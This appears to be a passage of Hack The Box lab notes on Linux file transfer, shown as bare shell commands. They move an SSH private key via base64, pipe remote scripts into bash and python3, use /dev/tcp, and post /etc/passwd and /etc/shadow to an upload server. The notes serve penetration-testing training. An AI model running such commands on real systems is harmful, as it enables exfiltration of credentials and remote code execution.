...
```c
anhlong@htb[/htb]$ cat id_rsa |base64 -w 0;echo
...
```c
anhlong@htb[/htb]$ echo -n '' | base64 -d > id_rsa
```
...
```c
anhlong@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
...
```c
anhlong@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
...
```c
anhlong@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
...
```c
anhlong@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
...
```c
anhlong@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
...
```c
anhlong@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
...
```c
anhlong@htb[/htb]$ sudo systemctl enable ssh
...
```c
anhlong@htb[/htb]$ sudo systemctl start ssh

```

## Checking for SSH Listening Port
 ```c
 anhlong@htb[/htb]$ netstat -lnpt
...
```c
anhlong@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
...
```c
anhlong@htb[/htb]$ sudo python3 -m pip install --user uploadserver
...
```c
anhlong@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
...
```c
anhlong@htb[/htb]$ mkdir https && cd https

anhlong@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
...
```c
anhlong@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
...
```c
anhlong@htb[/htb]$ python3 -m http.server
...
```c
anhlong@htb[/htb]$ php -S 0.0.0.0:8000
...
```c
anhlong@htb[/htb]$ ruby -run -ehttpd . -p8000
...
```c
anhlong@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
...
```c
anhlong@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
